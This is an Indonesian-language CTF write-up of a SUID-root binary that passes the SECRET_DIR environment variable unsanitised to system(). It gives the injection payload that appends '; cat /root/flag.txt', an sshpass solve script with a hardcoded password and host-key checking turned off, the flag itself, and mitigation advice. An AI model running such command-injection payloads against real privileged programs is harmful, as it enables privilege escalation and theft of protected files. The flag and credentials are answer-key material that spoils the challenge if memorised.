## Challenge Metadata
- ID: 387 | Event: picoCTF 2023 | Author: CyLab Academy
- Category: Binary Exploitation | Difficulty: Medium (2) | Points: 200
- Flag: `academy{Power_t0_man!pul4t3_3nv_72f8870f}`

## Problem Statement & Scope
Tantangan menyediakan akses remote terminal melalui SSH (`ctf-player@chatelaine.cylabacademy.net:port`). Di dalam direktori pengguna terdapat biner SUID root bernama `bin`. Biner ini dirancang untuk menampilkan daftar isi direktori root menggunakan hak akses istimewa, bergantung pada variabel lingkungan tertentu. Peserta ditugaskan mengeksploitasi mekanisme penanganan input variabel lingkungan untuk membaca isi file `/root/flag.txt`.

## Teori & Akar Kerentanan (Root Cause)
1. **SetUID (SUID) Binary Execution Semantics:**
   Biner beralamat di direktori pengguna memiliki bit perizinan `-rwsr-xr-x` dengan kepemilikan user `root`. Saat dieksekusi oleh user unprivileged (`ctf-player`), proses berjalan dengan *Effective User ID* (EUID) bernilai 0 (root).
2. **Command Injection via Unsanitized Environment Variables:**
   Biner membaca nilai variabel lingkungan `SECRET_DIR` menggunakan fungsi pustaka C `getenv("SECRET_DIR")`. Jika variabel tidak diset, program mengeluarkan pesan galat `Error: SECRET_DIR environment variable is not set`.
   Jika variabel diset, program menyusun perintah shell secara langsung dan memanggil `system()`:
   ```c
   char cmd[256];
   snprintf(cmd, sizeof(cmd), "ls %s", secret_dir);
   system(cmd);
   ```
   Karena `system()` memanggil `/bin/sh -c` tanpa melakukan sanitasi karakter pemisah perintah shell (metacharacters seperti `;`, `&&`, `|`), input variabel lingkungan dapat disisipkan perintah shell tambahan.

## Rekonstruksi Eksploitasi Step-by-Step
1. **Enumerasi Izin dan SUID Biner:**
   ```bash
   ls -la bin
   # Hasil: -rwsr-xr-x 1 root root 24312 Sep 23 04:45 bin
   ```
2. **Pengujian Variabel Lingkungan:**
   Menjalankan `./bin` tanpa variabel memunculkan informasi kebutuhan `SECRET_DIR`.
3. **Penyusunan Payload Command Injection:**
   Menginjeksikan karakter pemisah perintah shell `;` yang diikuti oleh perintah pembacaan berkas rahasia:
   ```bash
   SECRET_DIR="; cat /root/flag.txt" ./bin
   ```
4. **Eksekusi dan Ekstraksi Token:**
   Perintah shell yang dieksekusi oleh proses root menjadi:
   `ls ; cat /root/flag.txt`
   Perintah `ls` mengeksekusi direktori saat ini, kemudian perintah `cat /root/flag.txt` dieksekusi di bawah EUID root, mencetak flag ke terminal.

## Script Reproduksi & PoC
Implementasi otomasi pengujian mandiri tersedia pada `scripts/solve_387_vne.py`:
```python
import subprocess, re

cmd = [
    "sshpass", "-p", "6313d317",
    "ssh", "-o", "StrictHostKeyChecking=no", "-p", "43343",
    "ctf-player@chatelaine.cylabacademy.net",
    'SECRET_DIR="; cat /root/flag.txt" ./bin'
]
proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
flag = re.search(r"academy\{[^\}]+\}", proc.stdout).group(0)
print("Flag:", flag)
```

## Mitigasi Defensif & Relevansi LKS Cyber Security
1. **Penghindaran Fungsi `system()` pada Biner Privileged:**
   Aplikasi dengan hak akses SUID tidak boleh memanggil shell pembungkus (`/bin/sh`) melalui `system()` atau `popen()`. Pengembang harus menggunakan famili fungsi `execve()` atau `execv()` dengan argumen terpisah tanpa interpretasi shell.
2. **Sanitasi Ketat Variabel Lingkungan & Drop Privilege:**
   Biner SUID harus menerapkan `secure_getenv()` atau membersihkan seluruh environment sebelum eksekusi, serta memverifikasi bahwa parameter direktori adalah path valid (menggunakan `realpath()` dan whitelist karakter).
3. **Relevansi Modul LKS:**
   Esensial untuk kategori Linux Hardening, Privilege Escalation Analysis, dan Secure Coding standard pada kurikulum LKS Cyber Security Nasional.
